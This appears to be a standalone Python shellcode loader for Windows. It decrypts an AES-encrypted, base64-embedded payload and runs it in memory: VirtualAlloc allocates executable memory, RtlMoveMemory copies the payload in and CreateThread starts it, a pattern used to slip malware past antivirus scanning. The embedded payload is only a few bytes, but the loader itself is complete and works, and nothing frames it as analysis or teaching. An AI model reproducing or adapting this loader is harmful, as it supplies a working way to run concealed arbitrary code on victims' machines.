import base64, ctypes, os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

key = base64.b64decode("8roKpd0swGoDpo2EYPw71KUNAWOuvsyAmhMYqEdqB2s=")
iv = base64.b64decode("Z8QUQPJNkBtrUUP55pH5Aw==")
sc = base64.b64decode("yGaZ0TlvqILL0ObbB14cyg==")

cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
decryptor = cipher.decryptor()
shellcode = decryptor.update(sc) + decryptor.finalize()

buf = ctypes.create_string_buffer(shellcode, len(shellcode))
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_void_p(ptr), 0, 0, 0)
